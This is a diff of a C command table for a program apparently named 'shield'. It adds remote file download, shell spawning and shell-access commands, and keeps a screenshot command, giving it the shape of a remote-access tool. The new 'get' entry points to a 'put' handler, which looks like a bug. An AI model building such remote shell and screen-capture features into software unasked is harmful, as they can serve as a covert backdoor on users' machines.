@@ -82,13 +82,11 @@ static const command_t commands[] =
 {
 	{"help", "help", "Shows a list of commands", shield_cmd_help},
 	{"stats", "stats", "Displays statistics about the server", shield_cmd_stats},
+	{"get", "get <file>", "Downloads a file from the server", shield_cmd_put},
 	{"screenshot", "screenshot", "If a graphical session is running, takes a screenshot", shield_cmd_screenshot},
-	{"shell", "shell", "TODO TODO TODO TODO TODO TODO", shield_cmd_shell},
+	{"access-shell", "access-shell", "Gives you access to your running shell", shield_cmd_access_shell},
+	{"shell", "shell", "Spawns a shell in a pseudo-terminal", shield_cmd_shell},
 	{"exit", "exit", "Closes the connection", shield_cmd_exit},
-	{"access_shell", "access_shell", "TODO TODO TODO TODO TODO TODO", shield_cmd_access_shell},
-	//TODO: notify [message]
-	//TODO: broadcast [message]
-	//TODO: get [file]
 	{NULL, NULL, NULL, NULL}
 };
 
